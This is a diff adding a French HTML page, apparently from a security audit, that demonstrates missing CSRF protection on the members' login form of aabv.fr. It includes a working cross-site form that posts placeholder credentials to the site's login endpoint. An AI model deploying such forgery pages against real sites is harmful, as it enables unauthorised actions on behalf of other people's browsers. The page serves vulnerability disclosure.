@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>DÉMO — CSRF login aabv.fr</title>
+  <style>
+    body { font-family: system-ui, sans-serif; max-width: 720px; margin: 40px auto; padding: 0 20px; }
+    .warn { background: #fff3cd; border: 1px solid #ffc107; padding: 16px; border-radius: 8px; margin-bottom: 24px; }
+    pre { background: #f4f4f4; padding: 12px; border-radius: 6px; overflow-x: auto; }
+    button { background: #e74c3c; color: #fff; border: none; padding: 12px 24px; border-radius: 6px; cursor: pointer; font-size: 1rem; }
+  </style>
+</head>
+<body>
+  <div class="warn">
+    <strong>Démonstration audit autorisé</strong> — Cette page externe envoie un POST vers aabv.fr
+    sans jeton CSRF, prouvant l'absence de protection anti-CSRF sur le formulaire de connexion.
+  </div>
+
+  <h1>Preuve CSRF — formulaire de connexion</h1>
+  <p>Le site aabv.fr n'inclut <strong>aucun jeton CSRF</strong> dans le formulaire adhérents (<code>POST /</code>).</p>
+  <p>Une page hébergée sur <em>n'importe quel autre domaine</em> peut soumettre ce formulaire :</p>
+
+  <pre>&lt;form method="POST" action="https://www.aabv.fr/"&gt;
+  &lt;input name="login" value="..."&gt;
+  &lt;input name="mdp" value="..."&gt;
+  &lt;input name="remindme" value="1"&gt;
+&lt;/form&gt;</pre>
+
+  <form id="csrfForm" method="POST" action="https://www.aabv.fr/" target="_blank">
+    <input type="hidden" name="login" value="demo_audit_csrf">
+    <input type="hidden" name="mdp" value="motdepasse_demo">
+    <input type="hidden" name="remindme" value="0">
+    <button type="submit">Envoyer POST cross-site vers aabv.fr</button>
+  </form>
+
+  <p style="margin-top:24px;color:#666;font-size:0.9rem">
+    Au clic : une nouvelle fenêtre s'ouvre sur aabv.fr avec la réponse du serveur
+    (message « Login et/ou mot de passe incorrects »).<br>
+    <strong>Preuve :</strong> le serveur accepte les requêtes POST sans vérifier l'origine ni un jeton secret.
+  </p>
+</body>
+</html>
